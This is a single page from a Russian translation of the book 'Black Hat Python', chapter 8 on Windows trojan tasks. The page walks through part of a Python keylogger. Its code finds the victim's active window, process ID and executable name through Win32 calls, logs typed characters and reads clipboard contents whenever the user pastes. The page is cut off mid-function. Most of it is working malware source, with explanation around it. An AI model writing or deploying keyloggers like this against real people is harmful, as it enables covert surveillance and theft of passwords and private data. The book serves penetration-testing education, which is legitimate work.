# Black Hat Python. Программирование для хакеров и пентестеров — страница 160

Источник: `Black Hat Python. Программирование для хакеров и пентестеров.pdf`

160   Глава 8. Распространенные троянские задачи в Windows
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid)) 
        process_id = f'{pid.value}'
        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid) 
        windll.psapi.GetModuleBaseNameA(
                    h_process, None, byref(executable), 512)
        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512) 
            try:
                self.current_window = window_title.value.decode()
            except UnicodeDecodeError as e:
                print(f'{e}: window name unknown')
            print('\n', process_id, 
                executable.value.decode(), self.current_window)
            windll.kernel32.CloseHandle(hwnd)
            windll.kernel32.CloseHandle(h_process)
Отлично! Мы определили константу TIMEOUT , создали новый класс
KeyLogger  и написали метод get_current_process , который будет захва-
тывать активное окно вместе с его ID. Внутри этого метода мы сначала
делаем вызов GetForeGroundWindow  , который возвращает дескриптор
активного окна на рабочем столе жертвы. Затем передаем этот дескриптор
функции GetWindowThreadProcessId  , чтобы получить ID процесса, кото-
рому принадлежит окно. Дальше открываем этот процесс  и получаем его
дескриптор, по которому находим имя его исполняемого файла . В каче-
стве итогового шага записываем полный текст заголовка окна, используя
функцию GetWindowTextA  . В конце вспомогательного метода выводим
всю полученную информацию  в аккуратном виде, чтобы наглядно по-
казать все нажатия клавиш, а также процессы и окна, которым они пред-
назначались. Т еперь допишем наш кейлоггер, дополнив его необходимой
функциональностью:
    def mykeystroke(self, event):
        if event.WindowName != self.current_window: 
            self.get_current_process()
        if 32 < event.Ascii < 127: 
            print(chr(event.Ascii), end='')
        else:
            if event.Key == 'V': 
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}')
            else:
